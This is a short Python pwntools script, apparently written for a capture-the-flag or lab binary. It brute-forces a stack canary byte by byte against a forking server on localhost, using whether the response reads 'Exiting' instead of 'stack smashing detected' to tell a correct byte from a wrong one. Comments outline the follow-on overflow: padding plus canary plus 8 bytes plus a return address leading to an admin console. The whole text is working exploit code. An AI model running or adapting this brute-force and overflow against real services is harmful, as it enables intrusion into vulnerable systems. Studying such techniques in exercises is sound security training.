from pwn import *
import sys

port = sys.argv[1]


print("starting brute force loop")

canary = b'B'*24

# search all possible bytes, but search 'B' first. This way we dont have to hardcode padding, it just finds it itsself.
searchrange = list(range(256))
#searchrange.insert(0, searchrange.pop(66))
#print(searchrange)


p = remote("localhost", port)

p.clean()
print("Testing server response:")
p.send(canary)
print(p.clean())
p.send("exit\n".encode("utf-8"))

response = p.recv(timeout=0.1).decode("utf-8")
print("Response: ",str(response))
p.close()


while len(canary) < 32:  # 24+8=32
    print("Length = ", len(canary), "8" * 300)
    for i in searchrange:

        p = remote("localhost", port)

        p.clean()

        cbyte = bytes([i])

        # attempt = padding + canary + cbyte

        attempt = canary + cbyte

        print("Attempting i=", i, ": ", attempt)
        p.send(attempt)
        p.clean()
        p.send("exit\n".encode("utf-8"))
        
        
        #sleep(0.1)
        
        response = "Null"
        try:
            response = p.recv(timeout=0.1).decode("utf-8")
            print("Response: ",str(response))
        except EOFError as e:
            print(e)
            
        p.close()
        
        # revieve "Exiting" instead?
        # dont automate the server creation?
        # offset + canary + 8bytes + return to adress 401686
        # enter l33t on the server!!!!!
        
        if ("Exiting" in response):
            canary += cbyte
            print("Success! Bytes ", canary, " do not trigger 'stack smashing detected'!", 200 * '%')
            break

        if i == 255:
            print("Exhausted search options, could not find canary byte. :-(")
            exit()
print("Canary is: ", canary)

#gdb.attach(serv, gdbscript = "set follow-fork-mode child\n break send_closing_message \n break admin_console")

#serv.recvuntil("Keep the process alive!")